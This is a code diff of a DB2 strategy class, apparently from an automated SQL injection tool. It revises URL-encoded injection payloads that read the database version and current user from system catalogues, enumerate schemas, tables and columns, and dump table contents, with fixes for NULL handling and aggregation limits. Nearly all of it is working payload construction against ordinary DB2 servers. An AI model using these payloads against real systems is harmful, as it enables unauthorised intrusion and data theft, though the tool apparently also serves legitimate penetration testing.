@@ -15,7 +15,8 @@ public class DB2Strategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-            "select+hex(versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user)||'i'from+sysibm.sysversions";
+            "select+versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user||'%01%03%03%07'from+sysibm.sysversions";
+//        "select+hex(versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user)||'i'from+sysibm.sysversions";
     }
 
     @Override
@@ -24,7 +25,9 @@ public class DB2Strategy implements ISQLStrategy {
             /**
              * First substr(,3) remove 'gg' at the beginning
              */
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(schemaname))||'jj30hh'))as+varchar(1024)),3)||'i'from+syscat.schemata{limit}";
+//                select LISTAGG(''||trim(schemaname)||'', '')  WITHIN GROUP(ORDER BY schemaname ASC) as ids from syscat.schemata group by 1;
+            "select+varchar(LISTAGG('%04'||trim(schemaname)||'%050%04')||'%01%03%03%07')from+syscat.schemata{limit}";
+//        "select+substr(xmlserialize(xmlagg(xmltext('%06'||'%04'||trim(schemaname)||'%051%04'))as+varchar(1024)),3)||'%01%03%03%07'from+syscat.schemata{limit}";
     }
 
     @Override
@@ -33,27 +36,37 @@ public class DB2Strategy implements ISQLStrategy {
             /**
              * First substr(,3) remove 'gg' at the beginning
              */
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+name+from+sysibm.systables+where+creator='"+database+"'{limit})x";
+//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+//            + "(select+name+from+sysibm.systables+where+creator='"+database+"'{limit})x";
+        "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.systables+where+creator='"+database+"'{limit}";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+name+from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'+{limit})x";
+//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+//            + "(select+name+from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'+{limit})x";
+        "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'{limit}";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
-        formatListColumn = formatListColumn.replace("{%}", "||''))||chr(127)||trim(varchar(");
-        formatListColumn = "trim(varchar(" + formatListColumn + "||''))";
+        /**
+         * null breaks query => coalesce
+         */
+        formatListColumn = formatListColumn.replace("{%}", "||''),''))||chr(127)||trim(coalesce(varchar(");
+        formatListColumn = "trim(coalesce(varchar(" + formatListColumn + "||''),''))";
         
         return
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||r||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+hex(" + formatListColumn + ")r+from+" + database + "." + table + "+where+1=1+{limit})x";
+//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||r||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+//            + "(select+hex(" + formatListColumn + ")r+from+" + database + "." + table + "+where+1=1+{limit})x";
+        /**
+         * LISTAGG limit is 4000 and aggregate all data before limit is applied
+         * => subquery
+         */
+                "select+varchar(LISTAGG('%04'||s||'%051%04')||'%01%03%03%07')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
     }
 
     @Override
@@ -213,10 +226,10 @@ public class DB2Strategy implements ISQLStrategy {
               /**
                * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                */
-              "replace('SQLi'||substr(" +
+              "varchar(replace('SQLi'||substr(" +
                   "(" + sqlQuery + ")," +
                   startPosition +
-              "),'SQLii','SQLi')+from+sysibm.sysdummy1)";
+              "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
     }
 
     @Override
@@ -241,7 +254,7 @@ public class DB2Strategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
+                "varchar('SQLi$1'||repeat('%23',1024)||'iLQS')"
             );
     }
 
